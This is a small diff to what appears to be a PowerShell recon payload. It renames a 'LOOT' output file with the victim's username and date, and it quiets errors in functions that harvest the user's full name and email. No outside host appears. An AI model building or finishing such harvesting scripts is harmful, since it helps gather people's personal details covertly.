@@ -1,4 +1,4 @@
-$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
+$FileName = "$env:tmp\$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -11,9 +11,8 @@ function Get-fullName {
  # If no name is detected function will return $env:UserName 
 
     # Write Error is just for troubleshooting 
-    catch {Write-Error "No name was detected" 
+    catch {Write-Error "No name was detected" -ErrorAction SilentlyContinue
     return $env:UserName
-    -ErrorAction SilentlyContinue
     }
 
     return $fullName 
@@ -36,9 +35,8 @@ function Get-email {
 # If no email is detected function will return backup message for sapi speak
 
     # Write Error is just for troubleshooting
-    catch {Write-Error "An email was not found" 
+    catch {Write-Error "An email was not found" -ErrorAction SilentlyContinue
     return "No Email Detected"
-    -ErrorAction SilentlyContinue
     }        
 }
 
